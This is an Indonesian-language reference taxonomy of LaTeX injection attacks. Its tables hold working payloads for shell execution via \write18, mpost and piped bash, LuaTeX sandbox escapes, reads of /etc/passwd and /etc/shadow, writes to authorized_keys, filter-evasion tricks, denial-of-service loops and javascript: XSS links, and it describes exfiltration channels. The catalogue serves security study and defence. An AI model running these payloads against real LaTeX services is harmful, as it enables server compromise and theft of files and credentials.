---
title: "Latex Injection"
description: ""
---

## Struktur Klasifikasi

LaTeX injection mengeksploitasi desain fundamental TeX sebagai **bahasa pemrograman Turing-complete** yang menyamar sebagai sistem typesetting dokumen. Karena TeX menyediakan file I/O yang tidak dibatasi, ekspansi macro, dan — dalam banyak konfigurasi — eksekusi shell command, sistem apa pun yang mengompilasi input LaTeX yang dikendalikan pengguna mewarisi seluruh attack surface dari lingkungan arbitrary code execution.

Taksonomi ini mengorganisasi ruang mutasi di sepanjang tiga sumbu:

**Sumbu 1 — Target Mutasi (Utama):** Primitive struktural atau fitur engine yang dieksploitasi. Ini menentukan *mekanisme apa* yang dimanfaatkan penyerang. Kategori mencakup command execution primitive, operasi file I/O, fitur engine-specific (LuaTeX, XeTeX), mekanisme penghindaran filter/sandbox, vektor konsumsi sumber daya, dan manipulasi output channel.

**Sumbu 2 — Security Boundary yang Dilanggar (Lintas):** Jenis perlindungan yang dihindari oleh setiap mutasi. Ini menjelaskan *mengapa* mutasi berhasil dalam deployment tertentu.

| Tipe Boundary | Deskripsi |
|---|---|
| **Bypass no-shell-escape** | Mengeksekusi command meskipun ada konfigurasi `--no-shell-escape` |
| **Bypass restricted-shell-escape** | Menyalahgunakan command yang di-whitelist untuk mencapai eksekusi sembarang |
| **Penghindaran filter/blocklist** | Menghindari sanitasi input berbasis regex atau keyword |
| **Sandbox escape** | Keluar dari lingkungan kompilasi yang dikontainerisasi atau di-chroot jail |
| **Pelanggaran trust boundary** | Mengeksploitasi kepercayaan implisit pada file `.sty`/`.cls` atau pipeline kompilasi |

**Sumbu 3 — Attack Scenario (Pemetaan):** Arsitektur deployment di mana setiap mutasi dapat dipersenjatai. Dibahas dalam §8.

### Mekanisme Fundamental

Model keamanan TeX dirancang pada tahun 1978 untuk konteks kompilasi lokal single-user. Tiga properti yang membuat seluruh ruang mutasi ini memungkinkan:

1. **Turing completeness**: TeX mendukung loop, kondisional, rekursi, dan ekspansi macro — cukup untuk mengimplementasikan algoritma apa pun, termasuk logika eksploitasi.
2. **File I/O yang tidak dibatasi secara default**: `\openin`, `\openout`, `\read`, `\write` beroperasi pada filesystem host dengan hak akses proses kompilasi.
3. **Shell bridge via `\write18`**: Ketika diaktifkan, menyediakan eksekusi OS command langsung. Bahkan ketika dinonaktifkan, beberapa jalur bypass tetap ada melalui fitur engine-specific dan penyalahgunaan program yang di-whitelist.

---

## §1. Command Execution Primitive

Vektor serangan paling langsung: mengeksekusi OS command sembarang melalui antarmuka shell bawaan TeX atau mekanisme yang setara.

### §1-1. Direct Shell Execution via `\write18`

Primitive `\write18{command}` menulis ke file descriptor 18, yang dipetakan ke system shell. Ketika `--shell-escape` diaktifkan, ini menyediakan eksekusi command yang tidak dibatasi.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **`\write18` dasar** | Pemanggilan shell command langsung | `\immediate\write18{id > /tmp/out}` |
| **`\write18` tertunda** | Command dieksekusi saat page shipout, bukan segera | `\write18{id > /tmp/out}` |
| **Prefiks `\immediate`** | Memaksa eksekusi sinkron sebelum kompilasi dilanjutkan | `\immediate\write18{env \| base64 > out.tex}` |
| **Capture output berantai** | Eksekusi command, redirect ke file, lalu `\input` hasilnya | `\immediate\write18{cat /etc/passwd > r.tex}\input{r.tex}` |
| **Encoding base64 untuk output bersih** | Mengodekan output command untuk menghindari error karakter spesial TeX | `\immediate\write18{env \| base64 > test.tex}\input{test.tex}` |

**Kondisi Kunci:** Memerlukan flag `--shell-escape` atau `shell_escape=t` dalam `texmf.cnf`. Ini adalah vektor yang paling banyak didokumentasikan namun juga paling sering dibatasi.

### §1-2. Pipe Input Execution

Command `\input` mendukung sintaks pipe pada beberapa engine, memungkinkan eksekusi command tanpa `\write18` eksplisit.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Pipe input dasar** | Output command diumpankan langsung sebagai input TeX | `\input\|ls\|base64` |
| **Sintaks pipe dengan tanda kutip** | Pemberian tanda kutip alternatif untuk argumen command | `\input{"/bin/hostname"}` |
| **Bypass spasi IFS** | Menggunakan `${IFS}` untuk menggantikan spasi dalam argumen command | `\input\|uname${IFS}-a\|base64` |
| **Decode command base64** | Mengodekan seluruh command dalam base64 untuk melewati filter | `\input\|echo${IFS}aWQ=\|base64${IFS}-d\|bash` |

**Kondisi Kunci:** Persyaratan shell-escape yang sama seperti §1-1. Pipe input adalah sintaks alternatif yang mencapai jalur eksekusi yang sama.

### §1-3. Restricted Shell Escape Abuse

Ketika mode `--shell-restricted` aktif, hanya program yang di-whitelist (didefinisikan dalam `shell_escape_commands`) yang dapat dipanggil via `\write18`. Namun, beberapa program yang di-whitelist mengandung fitur yang memungkinkan eksekusi command sembarang.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Injeksi `mpost -tex`** | Parameter `-tex` milik MetaPost menentukan pemroses TeX mana yang menangani label teks; menerima command sembarang | `\immediate\write18{mpost -ini "-tex=bash -c (id)>/tmp/pwn" x.mp}` |
| **`mpost` dengan bypass IFS** | Menggunakan `${IFS}` untuk menyuntikkan spasi dalam parameter `-tex` | `\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}` |
| **`mpost` via base64** | Mengodekan payload untuk menghindari pembatasan karakter | `mpost -ini '-tex=bash -c (base64${IFS}-d<<<aWQ=\|bash)' f.txt` |
| **Eksploitasi pipe `epstopdf`** | Fitur pipe GhostScript memungkinkan eksekusi command melalui konversi EPS | `\immediate\write18{epstopdf --gsopt=-dSAFER=false malicious.eps}` |
| **Directory traversal `repstopdf`** | Menimpa file di dot-directory (mis. `.ssh/authorized_keys`) saat dijalankan dari direktori home | Path traversal via output path `repstopdf` |
| **Info leak `bibtex8` / `kpsewhich`** | Utilitas yang di-whitelist yang membocorkan informasi versi/path | `\input{"\|bibtex8 --version > /tmp/b.tex"}` |

**Kondisi Kunci:** Memerlukan `--shell-restricted` (atau `shell_escape=p`). Kelemahan fundamental adalah bahwa program yang di-whitelist diasumsikan "tidak memiliki fitur untuk memanggil program lain secara sembarang" — asumsi yang dilanggar oleh parameter `-tex` milik `mpost`.

### §1-4. Engine-Specific Command Execution

Engine TeX yang berbeda memiliki jalur eksekusi command yang unik yang melewati pembatasan `\write18` standar.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **LuaTeX `io.popen` via `debug.getupvalue`** | Mengeksploitasi debug library Lua untuk mengekstrak `io.popen` asli yang tidak dibatasi dari closure wrapper keamanan (CVE-2023-32700) | `debug.getupvalue(io.popen, 1)` lalu panggil langsung |
| **Sisa `os.execute` LuaTeX** | Pada versi lama, `os.execute` tidak sepenuhnya dinonaktifkan dalam mode restricted | Lua `os.execute("command")` langsung |
| **Bypass `package.loaded.debug` LuaTeX** | Meski pengaturan `--safer` menetapkan `debug=nil`, modul tetap dapat diakses via `package.loaded.debug` | `package.loaded.debug.getupvalue(...)` |

**Kondisi Kunci:** LuaTeX versi 1.04–1.16.1 (TeX Live 2017–2022). Diperbaiki dalam LuaTeX 1.17.0 dengan mengimplementasikan ulang wrapper `io.popen` dalam C alih-alih Lua. Memengaruhi **semua** mode shell-escape termasuk `--no-shell-escape`.

---

## §2. File Read Primitive

Membaca file sembarang dari filesystem host. Teknik-teknik ini bekerja bahkan dengan `--no-shell-escape` dalam sebagian besar konfigurasi, karena file I/O adalah kemampuan inti TeX.

### §2-1. Command Input File Native TeX

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Penyertaan file `\input`** | Menginterpretasikan konten file sebagai kode TeX; error pada karakter spesial | `\input{/etc/passwd}` |
| **Penyertaan file `\include`** | Mirip dengan `\input` tetapi dibatasi pada file berekstensi `.tex` dan menambahkan page break | `\include{secret}` (membaca `secret.tex`) |
| **Primitive internal `\@@input`** | Internal LaTeX yang melewati beberapa wrapper `\input` | `\makeatletter\@@input\|"command"` |
| **Varian `\@input`** | Command input internal alternatif | `\makeatletter\@input{/etc/passwd}` |

**Keterbatasan:** `\input` menginterpretasikan konten sebagai TeX, sehingga file yang mengandung `$`, `#`, `&`, `_`, `{`, `}` atau `\` akan menyebabkan error atau salah interpretasi. Ini membuatnya tidak dapat diandalkan untuk file biner atau kode.

### §2-2. Literal/Verbatim File Reading

Command yang membaca konten file tanpa interpretasi TeX, menghasilkan reproduksi yang setia.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **`\lstinputlisting`** | Dari paket `listings`; membaca file secara literal dengan syntax highlighting opsional | `\usepackage{listings}\lstinputlisting{/etc/passwd}` |
| **`\verbatiminput`** | Dari paket `verbatim`; menampilkan konten file dalam monospace, tidak diinterpretasikan | `\usepackage{verbatim}\verbatiminput{/etc/passwd}` |
| **`\VerbatimInput`** | Dari paket `fancyvrb`; verbatim yang disempurnakan dengan opsi pemformatan | `\usepackage{fancyvrb}\VerbatimInput{/etc/passwd}` |
| **Netralisasi catcode** | Mengubah category code karakter spesial menjadi "other" (12) sebelum `\input`, mencegah interpretasi TeX | `\catcode`\$=12 \catcode`\#=12 \input{script.pl}` |

**Kondisi Kunci:** Metode berbasis paket memerlukan paket yang relevan tersedia. Pendekatan catcode bersifat universal tetapi memerlukan pengetahuan karakter spesial mana yang perlu dinetralkan. Bypass `\verbatiminput` pada blocklist Anki (CVE-2024-29073) menunjukkan bahwa blocklist secara konsisten melewatkan command pembacaan alternatif.

### §2-3. File I/O Primitive Level Rendah

Pembacaan file berbasis stream langsung menggunakan sistem file handle TeX.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Baca satu baris** | Membuka stream file dan membaca baris pertama | `\newread\file \openin\file=/etc/issue \read\file to\line \line \closein\file` |
| **Baca loop multi-baris** | Melakukan iterasi melalui semua baris menggunakan `\loop..\repeat` | `\newread\file \openin\file=/etc/passwd \loop\unless\ifeof\file \read\file to\line \line \repeat \closein\file` |
| **Baca rekursif** | Menggunakan macro rekursif alih-alih `\loop` untuk menghindari filter keyword loop | `\def\r{\ifeof\file\else\read\file to\line\line\r\fi}` lalu `\openin\file=target \r` |
| **Loop kustom dengan counter** | Mendefinisikan macro loop dengan hitungan untuk membaca N baris | `\renewcommand\l[2]{\ifnum#1>0 #2\l{\numexpr#1-1\relax}{#2}\fi}` |

**Kondisi Kunci:** Bekerja dengan `--no-shell-escape`. Primitive `\openin`/`\read`/`\closein` selalu tersedia di TeX. Varian rekursif melewati filter yang memblokir keyword `\repeat`.

### §2-4. Penyematan File Biner via PDF Stream

Untuk file biner yang tidak dapat dibaca sebagai teks, pdfTeX menyediakan primitive untuk menyematkan file sembarang sebagai objek PDF stream.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **`\pdfobj stream file`** | Menyematkan file biner sembarang sebagai objek PDF stream | `\immediate\pdfobj stream attr{/Type /EmbeddedFile} file{/etc/shadow}` |
| **Pemulihan stream ID** | Stream yang disematkan dapat diekstrak dari PDF menggunakan object ID-nya | `\the\pdflastobj` mencetak nomor objek stream |

**Kondisi Kunci:** Khusus pdfTeX (`\pdfobj` tidak tersedia di XeTeX atau LuaTeX). Ekstraksi memerlukan post-processing PDF dengan alat seperti `mutool`. Teknik ini sangat berguna untuk exfiltration file biner (SSH key, file database, sertifikat) yang tidak dapat di-render sebagai teks.

---

## §3. File Write Primitive

Menulis konten sembarang ke filesystem host. Dikombinasikan dengan teknik lain, ini memungkinkan serangan multi-tahap.

### §3-1. File Output Native TeX

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **`\openout`/`\write` dasar** | Membuka file untuk ditulis dan menghasilkan konten | `\newwrite\file \openout\file=evil.tex \write\file{payload} \closeout\file` |
| **Immediate write** | Memaksa operasi tulis sinkron | `\immediate\openout\file=cmd.tex \immediate\write\file{content} \immediate\closeout\file` |
| **Timpa file sensitif** | Menarget file konfigurasi, authorized_keys, crontab | `\openout\file=../.ssh/authorized_keys` |
| **Multi-pass payload staging** | Pass pertama menulis kode eksploit ke file `.tex`; pass kedua mengeksekusinya via `\input` | Tulis `\immediate\write18{cmd}` ke file, lalu `\input{file}` pada rekompilasi |

**Kondisi Kunci:** File write selalu tersedia di TeX (tidak dibatasi oleh pengaturan shell-escape). Path penulisan relatif terhadap direktori kompilasi kecuali path absolut digunakan. MiKTeX di Windows secara historis tidak memberlakukan pembatasan pada output path.

---

## §4. Penghindaran Filter dan Blocklist

Ketika layanan web atau aplikasi mencoba untuk menyanitasi input LaTeX dengan memblokir command berbahaya, fleksibilitas sintaks TeX yang luar biasa menyediakan banyak jalur bypass.

### §4-1. Manipulasi Character Code (`\catcode`)

Sistem category code TeX menetapkan peran semantik untuk setiap karakter. Dengan menetapkan ulang category code, karakter apa pun dapat mengambil peran karakter lain, membuat filter berbasis keyword menjadi tidak efektif.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Penugasan ulang karakter escape** | Mengubah karakter sembarang (mis. `X`) menjadi kategori 0 (escape), menggantikan `\` | `\catcode`X=0 Xinput{/etc/passwd}` |
| **Kode superscript untuk encoding hex** | Menetapkan kategori 7 (superscript) ke karakter, memungkinkan encoding hex escape `^^XX` | `\catcode`\@=7 \in@@70ut{/etc/passwd}` (@@70 = `p`) |
| **Netralisasi karakter spesial** | Mengubah `$`, `#`, `_`, `&` menjadi kategori 12 (other), memungkinkan pembacaan file source code secara aman | `\catcode`\$=12 \catcode`\#=12 \input{script.py}` |

**Mengapa Berhasil:** Filter beroperasi pada representasi *tekstual* input. Sistem `\catcode` TeX mentransformasi semantik karakter *sebelum* parsing command, sehingga filter melihat `Xinput` (tidak berbahaya) sementara TeX menginterpretasikannya sebagai `\input` (berbahaya).

### §4-2. Hex Escape Sequence (`^^XX`)

Notasi `^^` TeX memungkinkan karakter apa pun direpresentasikan oleh code point heksadesimalnya. Ini berlaku di level tokenizer — sebelum ekspansi macro atau pencarian command apa pun.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Substitusi karakter tunggal** | Menggantikan satu karakter yang difilter dengan kode hexnya | `\lstin^^70utlisting{/etc/passwd}` (`^^70` = `p`) |
| **Encoding command penuh** | Mengodekan seluruh command karakter demi karakter | `^^5c^^69^^6e^^70^^75^^74{/etc/passwd}` = `\input{/etc/passwd}` |
| **Dikombinasikan dengan catcode** | Menetapkan ulang karakter superscript untuk mengaktifkan `^^` dengan delimiter alternatif | `\catcode`X=7 XX5cinput{/etc/passwd}` |

**Mengapa Berhasil:** Substitusi `^^XX` terjadi pada level leksikal terendah TeX (pemrosesan input karakter), sebelum tokenizer bahkan mulai mengidentifikasi control sequence. Tidak ada filtering regex pada string input yang dapat menangkap payload yang tidak mengandung karakter targetnya sampai setelah pemrosesan level TeX.

### §4-3. Konstruksi Nama Control Sequence (`\csname`)

Konstruk `\csname...\endcsname` milik TeX membangun nama control sequence dari token sembarang, termasuk yang tidak akan membentuk nama command yang valid secara normal.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Pemanggilan command tanpa backslash** | Membangun nama command tanpa menggunakan `\` sebelumnya | `\csname input\endcsname{/etc/passwd}` |
| **Konstruksi command dinamis** | Membangun nama command dari fragmen string | `\csname inp\endcsname{\csname ut\endcsname}` (dengan definisi yang sesuai) |

**Mengapa Berhasil:** Filter yang mencari `\input`, `\write18`, atau command serupa yang diawali backslash tidak akan cocok dengan `\csname input\endcsname`, meskipun keduanya dieksekusi identik.

### §4-4. Obfuscation Definisi Macro (`\def`)

Macro TeX memungkinkan manipulasi string sembarang. Dengan mendefinisikan macro yang mengembang menjadi fragmen command berbahaya, penyerang dapat membangun payload eksploitasi dari komponen yang tampak tidak berbahaya.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Perakitan ulang definisi terbagi** | Mendefinisikan macro terpisah untuk fragmen, lalu menggabungkannya | `\def\a{inp} \def\b{ut} \csname\a\b\endcsname{/etc/passwd}` |
| **Escaping string via `\string`** | Menggunakan `\string` untuk menghasilkan karakter backslash literal dalam output macro | `\def\cmd{\string\write\string18{ls}}` |
| **Multi-pass file staging** | Pass pertama menulis payload yang di-obfuscate ke file `.tex` menggunakan macro; pass kedua mengeksekusi hasil yang di-deobfuscate | Tulis `\def\imm{\string\immediate}...` ke file, kompilasi dua kali |
| **Immediate file staging (single-pass)** | Menggunakan `\immediate\openout` dan `\immediate\write` dengan `\string` untuk membuat dan mengeksekusi payload dalam satu pass | `\immediate\openout\f=cmd.tex \immediate\write\f{\string\immediate\string\write18{id}} \immediate\closeout\f \input{cmd.tex}` |

**Mengapa Berhasil:** Payload serangan hadir dalam fragmen terdistribusi yang secara individual tidak berbahaya sampai ekspansi macro merakitnya. Analisis statis input tidak akan menemukan command berbahaya yang lengkap.

### §4-5. Penyalahgunaan Environment `\begin`/`\end`

Mekanisme environment LaTeX memanggil `\commandname` ketika `\begin{commandname}` digunakan. Ini menyediakan cara lain untuk memanggil command sembarang tanpa sintaks backslash-command eksplisit.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Command yang dibungkus environment** | `\begin{X}` secara internal memanggil `\X`, sehingga `\begin{input}` memanggil `\input` | `\begin{input}{\|"id > /tmp/pwn"}\end{input}` |
| **Environment bersarang** | Merantai environment untuk membangun payload kompleks | Kombinasi `\begin{lstinputlisting}` dengan argumen path |

**Mengapa Berhasil:** Filter yang memblokir `\input` mungkin tidak memblokir `\begin{input}`, karena model filter tidak memperhitungkan mekanisme dispatch environment LaTeX.

### §4-6. Ketidaklengkapan Blocklist

Bahkan blocklist yang dibuat dengan baik secara sistematis melewatkan command karena banyaknya primitive TeX/LaTeX dan command paket yang dapat membaca, menulis, atau mengeksekusi.

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Command paket yang terlewat** | Blocklist mencakup `\input`, `\include`, `\write18` tetapi melewatkan `\verbatiminput`, `\lstinputlisting`, `\VerbatimInput` | CVE-2024-29073: Anki memblokir `\input`/`\include` tetapi melewatkan `\verbatiminput` |
| **Command internal LaTeX** | `\makeatletter` mengekspos `\@input`, `\@@input`, `\@iinput` — varian internal yang tidak ada dalam blocklist | `\makeatletter\@@input\|"id"` |
| **Konstruk loop alternatif** | Memblokir `\loop`/`\repeat` tidak mencegah macro rekursif | `\def\r{\ifeof\f\else\read\f to\l\l\r\fi}` |
| **Eksekusi yang disediakan paket** | Beberapa paket menyediakan mekanisme eksekusi command atau file I/O sendiri | Berbagai paket dengan fitur interaksi sistem |

**Mengapa Berhasil:** TeX/LaTeX memiliki ribuan command di ratusan paket. Blocklist terbatas apa pun dapat dihindari dengan menemukan alternatif yang tidak terdaftar yang memberikan fungsionalitas setara.

---

## §5. Attack Surface Engine-Specific

Engine TeX yang berbeda (pdfTeX, LuaTeX, XeTeX) memiliki arsitektur yang berbeda yang menciptakan kelas kerentanan yang unik.

### §5-1. LuaTeX: Eksploitasi Lua Runtime

LuaTeX menyematkan interpreter Lua penuh, yang secara dramatis memperluas attack surface melampaui primitive TeX tradisional.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Bypass shell escape `debug.getupvalue`** | Mengekstrak `io.popen` asli dari closure wrapper keamanan, melewati semua pembatasan shell-escape (CVE-2023-32700) | LuaTeX 1.04–1.16.1; memengaruhi mode `--no-shell-escape` |
| **Akses jaringan `luasocket`** | Library socket yang diaktifkan secara default memungkinkan HTTP request sembarang, upload/download data (CVE-2023-32668) | LuaTeX 0.27.0–1.16.2; socket diaktifkan secara default |
| **Persistensi `package.loaded.debug`** | `--safer` menetapkan `debug=nil` tetapi tidak menghapusnya dari `package.loaded`, memungkinkan pemulihan | Semua versi LuaTeX sebelum perbaikan |
| **Akses file library `io` Lua** | `io.open`/`io.read`/`io.write` milik Lua menyediakan akses file independen dari primitive TeX | Tersedia kecuali mode `--safer` digunakan |
| **Sisa library `os` Lua** | Beberapa fungsi `os.*` tetap dapat diakses dalam mode restricted | Tergantung versi |

**Signifikansi Arsitektur:** Penyematan bahasa scripting tujuan umum oleh LuaTeX berarti attack surface-nya adalah *gabungan* dari attack surface TeX dan attack surface Lua. Kerentanan CVE-2023-32700 sangat parah karena memengaruhi dokumen yang dikompilasi dengan **pengaturan keamanan default** (tanpa shell escape), melemahkan mitigasi utama yang diandalkan sebagian besar deployment.

### §5-2. LuaTeX: Serangan Berbasis Jaringan

Library `luasocket` (diaktifkan secara default hingga v1.17.0) memungkinkan operasi jaringan dari dalam dokumen.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Data exfiltration via HTTP** | Membaca file lokal dan mengirim konten ke server yang dikendalikan penyerang | `luasocket` tersedia (default pre-1.17.0) |
| **Reverse shell** | Membangun koneksi jaringan kembali ke penyerang untuk shell interaktif | Memerlukan socket dan kemampuan eksekusi command |
| **SSRF dari server kompilasi** | Dokumen memicu HTTP request ke layanan internal dari posisi jaringan server kompilasi | Layanan LaTeX berbasis web yang mengompilasi dengan LuaTeX |
| **Unduhan file berbahaya** | Mengunduh dan menulis file ke filesystem lokal | Kemampuan socket + file write |

### §5-3. Fitur pdfTeX-Specific

pdfTeX menyediakan primitive manipulasi PDF yang menciptakan vektor serangan yang unik.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Penyematan `\pdfobj stream file`** | Menyematkan file biner sembarang sebagai objek PDF stream untuk ekstraksi berikutnya | Hanya pdfTeX; tidak memerlukan shell-escape |
| **Manipulasi metadata PDF** | Menyuntikkan konten yang dikendalikan penyerang ke dalam field metadata PDF | Kompilasi pdfTeX apa pun |
| **Injeksi `\pdfliteral`** | Menyuntikkan operator PDF mentah ke dalam output stream | Hanya pdfTeX |

---

## §6. Denial of Service dan Resource Exhaustion

Turing completeness TeX berarti dokumen apa pun dapat mengonsumsi CPU, memori, atau sumber daya disk tanpa batas.

### §6-1. Konstruk Infinite Loop

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **`\loop\iftrue\repeat`** | Infinite loop paling sederhana menggunakan konstruk loop bawaan TeX | `\loop\iftrue\repeat` |
| **Recursive macro bomb** | Macro yang memanggil dirinya sendiri tanpa kondisi terminasi | `\def\nothing{\nothing}\nothing` |
| **Rekursi mutual** | Dua macro yang saling memanggil tanpa batas | `\def\a{\b}\def\b{\a}\a` |
| **Counter overflow loop** | Kondisi loop yang tidak pernah dapat terpenuhi karena overflow aritmatika | `\newcount\c\loop\advance\c by 1\repeat` (tanpa terminasi) |

**Kondisi Kunci:** Bekerja dengan `--no-shell-escape`. Bahkan previewer yang menonaktifkan sebagian besar fitur TeX rentan jika mereka mengizinkan `\loop`, `\def`, atau `\newcommand`.

### §6-2. Memory dan Expansion Bomb

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Ekspansi macro eksponensial** | Mendefinisikan macro yang berlipat ganda ukurannya dengan setiap level ekspansi | `\def\a{XX}\def\b{\a\a}\def\c{\b\b}...\z` |
| **Habiskan string pool** | Membuat token list yang sangat panjang yang menguras string pool TeX | Nesting dalam `\edef` dengan konten yang mengembang |
| **Flooding hash table** | Mendefinisikan jumlah control sequence yang sangat besar | Loop menghasilkan `\csname unique_N\endcsname` untuk N yang besar |
| **Habiskan font metric** | Meminta pemuatan file font yang sangat besar atau sangat banyak | `\font\f=file at 1000pt` (skala ekstrem) |

### §6-3. Resource Exhaustion Berbasis Disk

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Pembuatan file besar** | Menulis file output yang sangat besar via `\openout`/`\write` dalam loop | Loop menulis megabyte data ke file output |
| **Flooding file sementara** | Membuat ribuan file sementara | Loop dengan `\openout` ke nama file yang unik |
| **Amplifikasi auxiliary file** | Menghasilkan file `.aux`, `.toc`, `.lof`, `.lot` dengan ukuran ekstrem | Ribuan entri `\label`, `\tableofcontents` |

---

## §7. Cross-Site Scripting (XSS) via Rendering LaTeX

Ketika output LaTeX disematkan dalam halaman web — khususnya melalui library rendering matematika — injeksi XSS menjadi mungkin.

### §7-1. XSS Langsung Melalui Command LaTeX

| Subtipe | Mekanisme | Contoh |
|---|---|---|
| **Protokol javascript `\url`** | Command URL mungkin tidak menyanitasi skema protokol | `\url{javascript:alert(1)}` |
| **Protokol javascript `\href`** | Command hyperlink dengan payload JavaScript | `\href{javascript:alert(1)}{click}` |

### §7-2. Kerentanan Math Rendering Library

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **XSS macro `\unicode` MathJax** | Macro `\unicode{}` pada versi MathJax lama memungkinkan injeksi HTML (CVE-2018-1999024) | Versi MathJax sebelum perbaikan |
| **XSS pesan error KaTeX** | Pesan error dari LaTeX yang tidak valid tidak di-escape dengan benar, memungkinkan injeksi skrip | `markdown-it-katex` dan wrapper serupa |
| **XSS `markdown-it-texmath`** | Validasi yang tidak memadai dalam parser delimiter matematika memungkinkan injeksi JavaScript | Versi `markdown-it-texmath` yang terpengaruh |
| **XSS rendering math LaTeX Indico** | Kode math LaTeX dalam deskripsi contribution/abstract tidak tersanitasi dengan benar (CVE-2025-59035) | Indico sebelum 3.3.8 |

### §7-3. JavaScript yang Disematkan dalam PDF

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **JavaScript dalam PDF annotation** | LaTeX dapat membuat PDF annotation yang mengandung JavaScript yang dieksekusi saat PDF dibuka | PDF viewer mendukung eksekusi JavaScript |
| **Scripting form field** | PDF form field yang dibuat via paket LaTeX (mis. `hyperref`) dapat mengandung JavaScript yang dapat dieksekusi | Memerlukan paket yang mendukung PDF form |

---

## §8. Pemetaan Attack Scenario (Sumbu 3)

| Skenario | Arsitektur | Kategori Mutasi Utama | Tingkat Risiko |
|---|---|---|---|
| **Layanan kompilasi LaTeX berbasis web** | Pengguna mengirimkan source `.tex`; server mengompilasi ke PDF | §1 (RCE), §2 (file read), §5-1/§5-2 (LuaTeX), §6 (DoS) | **Kritis** — penyerang memiliki akses penuh ke server kompilasi |
| **Editor LaTeX kolaboratif** | Platform multi-pengguna (Overleaf, Papeeria) dengan kompilasi bersama | §1, §2, §3, §5, §6 | **Kritis** — lateral movement antar proyek pengguna memungkinkan |
| **Pipeline pembuatan dokumen** | Aplikasi menghasilkan LaTeX dari input pengguna (invoice, laporan, sertifikat) | §4 (filter evasion) → §1/§2 | **Tinggi** — partial LaTeX injection melalui interpolasi template |
| **Rendering matematika dalam web app** | Konversi LaTeX-ke-image/SVG sisi server untuk formula matematika | §2 (file read), §6 (DoS), §7 (XSS) | **Tinggi** — formula sering dikendalikan pengguna |
| **Sistem submission akademis** | Penulis mengirimkan file `.tex`/`.sty` untuk peer review | §3-2 (trojan style file), §1, §2, §5 | **Tinggi** — mengeksploitasi kepercayaan pada file "teks-saja" |
| **Kompilasi desktop (lokal)** | Pengguna mengompilasi file `.tex` yang diunduh secara lokal | §1, §2, §3, §3-2 (virus), §5-1 | **Sedang** — memerlukan social engineering |
| **Flashcard / aplikasi belajar** | Aplikasi mengompilasi snippet LaTeX untuk tampilan matematika (mis. Anki) | §2 (file read via bypass blocklist §4-6), §7 (XSS) | **Sedang** — CVE-2024-29073 |
| **Build dokumentasi CI/CD** | Kompilasi LaTeX otomatis dalam pipeline build | §1, §2, §5 | **Tinggi** — akses ke secret CI dan infrastruktur build |

---

## §9. Channel Data Exfiltration

Di luar pembacaan file langsung, penyerang dalam lingkungan yang dibatasi memerlukan metode untuk mengekstrak data dari server kompilasi.

### §9-1. In-Band Exfiltration (Via Output PDF)

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Teks yang di-render dalam PDF** | Konten file ditampilkan sebagai teks yang terlihat dalam dokumen output | Penyerang mengambil PDF yang dikompilasi |
| **Penyematan objek PDF stream** | File biner disematkan sebagai objek PDF stream (§2-4) | pdfTeX; memerlukan post-processing PDF untuk ekstraksi |
| **Channel metadata PDF** | Data disembunyikan dalam field metadata PDF (Author, Subject, Keywords, field kustom) | Engine TeX apa pun yang menghasilkan PDF |
| **Penyematan steganografis** | Data dikodekan ke dalam elemen visual (teks tak terlihat, putih di atas putih, skala mikro) | Penyerang dapat menganalisis struktur PDF |

### §9-2. Out-of-Band Exfiltration

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **`\write18` + `curl`/`wget`** | Shell command mengirim data ke server penyerang | Shell-escape diaktifkan |
| **LuaTeX socket exfiltration** | Library socket Lua mengirim HTTP request dengan konten file | LuaTeX dengan socket yang diaktifkan (§5-2) |
| **DNS exfiltration** | Mengodekan data dalam DNS query via shell command | Shell-escape + resolusi DNS dari server |
| **Pesan error kompilasi** | Error yang disengaja yang menyertakan data sensitif dalam output error yang terlihat oleh pengguna | Output error dikembalikan ke pengguna yang mengirimkan |
| **Kebocoran log file** | Data sensitif yang ditulis ke file `.log` yang dapat diakses pengguna | File log dikembalikan bersama output PDF |

---

## §10. Pemetaan CVE / Insiden Dunia Nyata

| Kombinasi Mutasi | CVE / Kasus | Dampak |
|---|---|---|
| §5-1 (bypass `debug.getupvalue` LuaTeX) | CVE-2023-32700 | **Kritis.** Eksekusi shell command sembarang pada dokumen LuaTeX 1.04–1.16.1 apa pun, bahkan dengan `--no-shell-escape`. Memengaruhi TeX Live 2017–2022 |
| §5-2 (socket LuaTeX diaktifkan secara default) | CVE-2023-32668 | **Tinggi.** Arbitrary network request dari dokumen yang dikompilasi. LuaTeX 0.27.0–1.16.2 (TeX Live 2009–2023, MiKTeX 2.9.0–23.4) |
| §4-6 (blocklist tidak lengkap — `\verbatiminput`) | CVE-2024-29073 | **Sedang.** Arbitrary file read di Anki 24.04 via command paket `verbatim` yang terlewat. Flashcard bersama sebagai attack vector |
| §7-2 (XSS `\unicode` MathJax) | CVE-2018-1999024 | **Sedang.** Eksekusi JavaScript di browser yang me-render konten MathJax via macro `\unicode{}` yang dibuat khusus |
| §7-2 (XSS math LaTeX Indico) | CVE-2025-59035 | **Sedang.** XSS melalui kode math LaTeX dalam deskripsi contribution Indico. Diperbaiki di Indico 3.3.8 |
